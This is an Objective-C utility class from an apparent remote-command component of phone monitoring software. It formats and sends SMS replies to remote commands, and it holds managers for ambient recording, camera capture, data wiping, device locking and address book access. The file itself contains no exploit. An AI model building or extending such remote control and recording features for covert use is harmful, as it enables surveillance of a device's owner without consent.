/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdUtils
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  18/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RemoteCmdUtils.h"
#import "FxSystemEvent.h"
#import "SMSSendMessage.h"
#import "RemoteCmdErrorMessage.h"
#import "RemoteCmdData.h";
#import "ProductInfoImp.h"
#import "AppContext.h"
#import "DateTimeFormat.h"
#import "DefStd.h"
#import "SMSCmd.h"
#import "PCC.h"

@implementation RemoteCmdUtils

@synthesize mSMSSender;
@synthesize mEventDelegate;
@synthesize mAppContext;
@synthesize mServerAddressManager;
@synthesize mPreferenceManager;
@synthesize mActivationManagerProtocol;
@synthesize mDataDelivery;
@synthesize mEventDelivery;
@synthesize mSystemUtils;
@synthesize mEventRepository;
@synthesize mConnectionHistoryManager;
@synthesize mConfigurationManager;
@synthesize mAddressbookManager;
@synthesize mLicenseManager;
@synthesize mMediaSearchPath;

@synthesize mSyncTimeManager;
@synthesize mSyncCDManager;
@synthesize mWipeDataManager;
@synthesize mDeviceLockManager;
@synthesize mApplicationProfileManager;
@synthesize mUrlProfileManager;
@synthesize mBookmarkManager;
@synthesize mApplicationManager;
@synthesize mAmbientRecordingManager;
@synthesize mCalendarManager;
@synthesize mNoteManager;
@synthesize mCameraEventCapture;

static RemoteCmdUtils *mRemoteCmdUtils = nil;

+ (RemoteCmdUtils *) sharedRemoteCmdUtils {
   DLog (@"sharedRemoteCmdUtils------->")
   @synchronized (self) {
       if (mRemoteCmdUtils == nil) {
            mRemoteCmdUtils =[[self alloc] init];
	   }
    }
    return mRemoteCmdUtils;
}

/**
 - Method name:createSystemEvent:andReplyMessage
 - Purpose:This method is used to create system event
 - Argument list and description: aReplyMessage (NSString), andSenderNumber(NSString)
 - Return type and description:No Return
*/

- (void) createSystemEvent:(id ) aEvent 
		   andReplyMessage: (NSString *) aReplyMessage {
	
	int remoteCommandType;
	if ([aEvent isKindOfClass:[RemoteCmdData class]]) {
		RemoteCmdData *event=(RemoteCmdData *)aEvent;
		remoteCommandType=[event mRemoteCmdType];
	}
	else if ([aEvent isKindOfClass:[SMSCmd class]]) {
		remoteCommandType=kRemoteCmdTypeSMS;
	}
	else {
	   remoteCommandType=kRemoteCmdTypePCC;	
	}

	DLog (@"createSystemEvent in RemoteCommand Utils");
	FxSystemEvent *systemEvent=[[FxSystemEvent alloc] init];
	[systemEvent setMessage:aReplyMessage];
	[systemEvent setDirection:kEventDirectionOut];
	[systemEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	switch (remoteCommandType) {
		case kRemoteCmdTypeSMS:
			[systemEvent setSystemEventType:kSystemEventTypeSmsCmdReply];
		break;
		case kRemoteCmdTypePCC:
			[systemEvent setSystemEventType:kSystemEventTypeNextCmdReply];
		break;
	}
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
	      [mEventDelegate performSelector:@selector(eventFinished:) withObject:systemEvent];
	}
	[systemEvent release];
 }

/**
 - Method name:sendSMSWithRecipientNumber:withRemoteCmdData:andErrorCode:
 - Purpose:This method is used to send reply message 
 - Argument list and description: aRecipientNumber (NSString), aRemoteCmdData(RemoteCmdData),aErrorCode (NSUInteger)
 - Return type and description:No Return
*/
- (void) sendSMSWithRecipientNumber:(NSString *) aRecipientNumber
						 andMessage: (NSString *)aMessage {
	DLog (@"Sending SMS....%@",aRecipientNumber);
	if ([aRecipientNumber length]) {
		SMSSendMessage *message = [[SMSSendMessage alloc] init];
	    [message setMMessage:aMessage];
	    [message setMRecipientNumber:aRecipientNumber];
	    if ([mSMSSender respondsToSelector:@selector(sendSMS:)]) {
		   [mSMSSender performSelector:@selector(sendSMS:) withObject:message];
		   DLog (@"Sent SMS Reply:%@ to: %@",aMessage,aRecipientNumber);
		}
		[message release];
	}
	else {
		DLog (@"Unable to send sms")
	}
}
  
- (NSString *) replyMessageFormatWithCommandCode:(NSString *) aCmdCode 
									andErrorCode:(NSUInteger) aErrorCode {
	if (![aCmdCode length]) aCmdCode=NSLocalizedString(@"kInvalid", @"");
	NSString *messageString=[NSString stringWithFormat:@"%@[%@]",[self getProductIdAndVersion], aCmdCode];
    if (aErrorCode==_SUCCESS_) {
		  messageString=[NSString stringWithFormat:@"%@ %@\n",messageString,NSLocalizedString(@"kOK", @"")];
	}
	else {
		if (aErrorCode == _ERROR_ || // Get empty string
			[[RemoteCmdErrorMessage errorMessage:aErrorCode] length]>0) 
		   messageString=[NSString stringWithFormat:@"%@ %@\n%@",messageString,NSLocalizedString(@"kERROR", @""),[RemoteCmdErrorMessage errorMessage:aErrorCode]];
		else 
		   messageString=[NSString stringWithFormat:@"%@ %@(%d)",messageString,NSLocalizedString(@"kERROR", @""),aErrorCode];
	 }
	return messageString;
}

/**
 - Method name:getProductIdAndVersion
 - Purpose: This is method is used to get product information .
 - Argument list and description: No argument
 - Return type and description: pidAndVersion (NSString *)
*/

- (NSString *) getProductIdAndVersion {
	id <ProductInfo> info=[mAppContext getProductInfo];
	NSString *pidAndVersion=[NSString stringWithFormat:@"[%d %@]",[info getProductID],[info getProductFullVersion]];
	return pidAndVersion;
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc { 
	[mSMSSender release];
	mSMSSender=nil;
	[mEventDelegate release];
	mEventDelegate=nil;
	[mAppContext release];
	mAppContext=nil;
	[mDataDelivery release];
	mDataDelivery=nil;
	[mEventDelivery release];
	mEventDelivery=nil;
	[mServerAddressManager release];
	mServerAddressManager=nil;
	[mPreferenceManager release];
    mPreferenceManager=nil;
	[mActivationManagerProtocol release];
	mActivationManagerProtocol = nil;
	[mSystemUtils release];
	mSystemUtils=nil;
	[mEventRepository release];
	mEventRepository=nil;
	[mConnectionHistoryManager release];
	mConnectionHistoryManager=nil;
	[mConfigurationManager release];
	mConfigurationManager=nil;
	[mAddressbookManager release];
	mAddressbookManager=nil;
	[mMediaSearchPath release];
	mMediaSearchPath=nil;
	[mLicenseManager release];
	mLicenseManager = nil;
	[super dealloc];	
}

@end
